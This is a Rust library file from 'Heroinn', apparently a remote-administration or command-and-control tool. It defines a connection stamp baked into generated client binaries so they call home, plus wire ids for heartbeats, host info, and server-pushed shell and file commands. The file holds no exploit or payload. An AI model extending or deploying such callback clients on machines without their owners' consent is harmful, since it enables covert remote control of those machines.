//! Foundations shared by the Heroinn server, client and worker binaries.
//!
//! This crate owns the wire protocol: the [`SlaveDNA`] connection stamp, the
//! message/command id mappings, the packet (de)serialization helpers and the
//! TCP/WebSocket/UDP transports built on top of them. Every byte layout here is
//! load-bearing for interoperability, so protocol changes must stay additive.

use std::io::{BufWriter, Cursor, Read, Write};

use dna::CONNECTION_INFO_FLAG;
use serde::{Deserialize, Serialize};

pub mod dna;
pub mod error;
pub mod ftp;
pub mod packet;
pub mod protocol;
pub mod rpc;
pub mod session;

pub use error::{Error, Result};

/// Interval, in seconds, between client heartbeats.
pub const HEART_BEAT_TIME: u64 = 5;

/// Connection stamp embedded into every generated `heroinn_client` binary.
///
/// The generator rewrites this fixed-size region in-place inside the executable
/// so the client learns where to dial home. `#[repr(align(1))]` keeps the
/// on-disk image byte-exact.
#[derive(Debug, Clone)]
#[repr(align(1))]
pub struct SlaveDNA {
    pub flag: [u8; 8],
    pub size: [u8; 8],
    pub data: [u8; 1024],
}

impl SlaveDNA {
    /// Build a stamp carrying `data`, which must fit in 1024 bytes.
    pub fn new(data: &[u8]) -> Result<Self> {
        if data.len() > 1024 {
            return Err(Error::PacketTooLarge(data.len()));
        }

        let mut buf = [0u8; 1024];
        buf[..data.len()].copy_from_slice(data);

        Ok(Self {
            flag: CONNECTION_INFO_FLAG,
            size: (data.len() as u64).to_be_bytes(),
            data: buf,
        })
    }

    /// Parse a stamp from its serialized form.
    pub fn parse(data: &[u8]) -> Result<Self> {
        let mut reader = Cursor::new(data);
        let mut flag = [0u8; 8];
        reader.read_exact(&mut flag)?;

        let mut size = [0u8; 8];
        reader.read_exact(&mut size)?;

        let mut data = [0u8; 1024];
        reader.read_exact(&mut data)?;

        Ok(Self { flag, size, data })
    }

    /// Serialize the stamp into its 1040-byte on-disk representation.
    pub fn serialize(&self) -> Vec<u8> {
        let mut ret = vec![];

        let mut writer = BufWriter::new(&mut ret);
        writer.write_all(&self.flag).unwrap();
        writer.write_all(&self.size).unwrap();
        writer.write_all(&self.data).unwrap();
        drop(writer);

        ret
    }
}

/// Location and label a generated client should connect back to.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ConnectionInfo {
    pub protocol: u8,
    pub address: String,
    pub remark: String,
}

impl ConnectionInfo {
    pub fn parse(data: &[u8]) -> Result<Self> {
        Ok(serde_json::from_slice(data)?)
    }

    pub fn serialize(&self) -> Result<Vec<u8>> {
        Ok(serde_json::to_vec(self)?)
    }
}

/// Messages a client sends up to the server.
#[derive(Debug, PartialEq, Eq)]
pub enum HeroinnClientMsgID {
    HostInfo,
    Heartbeat,
    SessionPacket,
}

impl From<HeroinnClientMsgID> for u8 {
    fn from(id: HeroinnClientMsgID) -> Self {
        match id {
            HeroinnClientMsgID::HostInfo => 0x00,
            HeroinnClientMsgID::Heartbeat => 0x01,
            HeroinnClientMsgID::SessionPacket => 0x02,
        }
    }
}

impl TryFrom<u8> for HeroinnClientMsgID {
    type Error = Error;

    fn try_from(v: u8) -> Result<Self> {
        match v {
            0x00 => Ok(HeroinnClientMsgID::HostInfo),
            0x01 => Ok(HeroinnClientMsgID::Heartbeat),
            0x02 => Ok(HeroinnClientMsgID::SessionPacket),
            other => Err(Error::UnknownMessageId(other)),
        }
    }
}

impl HeroinnClientMsgID {
    /// Byte value written on the wire.
    pub fn to_u8(&self) -> u8 {
        match self {
            HeroinnClientMsgID::HostInfo => 0x00,
            HeroinnClientMsgID::Heartbeat => 0x01,
            HeroinnClientMsgID::SessionPacket => 0x02,
        }
    }
}

/// Commands the server pushes down to a client.
#[derive(Debug, PartialEq, Eq)]
pub enum HeroinnServerCommandID {
    Shell,
    File,
    SessionPacket,
}

impl From<HeroinnServerCommandID> for u8 {
    fn from(id: HeroinnServerCommandID) -> Self {
        match id {
            HeroinnServerCommandID::Shell => 0x00,
            HeroinnServerCommandID::File => 0x01,
            HeroinnServerCommandID::SessionPacket => 0x02,
        }
    }
}

impl TryFrom<u8> for HeroinnServerCommandID {
    type Error = Error;

    fn try_from(v: u8) -> Result<Self> {
        match v {
            0x00 => Ok(HeroinnServerCommandID::Shell),
            0x01 => Ok(HeroinnServerCommandID::File),
            0x02 => Ok(HeroinnServerCommandID::SessionPacket),
            other => Err(Error::UnknownMessageId(other)),
        }
    }
}

impl HeroinnServerCommandID {
    /// Byte value written on the wire.
    pub fn to_u8(&self) -> u8 {
        match self {
            HeroinnServerCommandID::Shell => 0x00,
            HeroinnServerCommandID::File => 0x01,
            HeroinnServerCommandID::SessionPacket => 0x02,
        }
    }
}

/// Transport a listener or client speaks.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HeroinnProtocol {
    TCP,
    HTTP,
    UDP,
}

impl From<HeroinnProtocol> for u8 {
    fn from(proto: HeroinnProtocol) -> Self {
        match proto {
            HeroinnProtocol::TCP => 0x00,
            HeroinnProtocol::HTTP => 0x01,
            HeroinnProtocol::UDP => 0x02,
        }
    }
}

impl TryFrom<u8> for HeroinnProtocol {
    type Error = Error;

    fn try_from(v: u8) -> Result<Self> {
        match v {
            0x00 => Ok(HeroinnProtocol::TCP),
            0x01 => Ok(HeroinnProtocol::HTTP),
            0x02 => Ok(HeroinnProtocol::UDP),
            other => Err(Error::UnknownProtocol(other)),
        }
    }
}

impl HeroinnProtocol {
    /// Byte value written on the wire.
    pub fn to_u8(&self) -> u8 {
        self.clone().into()
    }
}

/// Current wall-clock time in milliseconds since the Unix epoch.
pub fn cur_timestamp_millis() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis()
}

/// Current wall-clock time in seconds since the Unix epoch.
pub fn cur_timestamp_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}
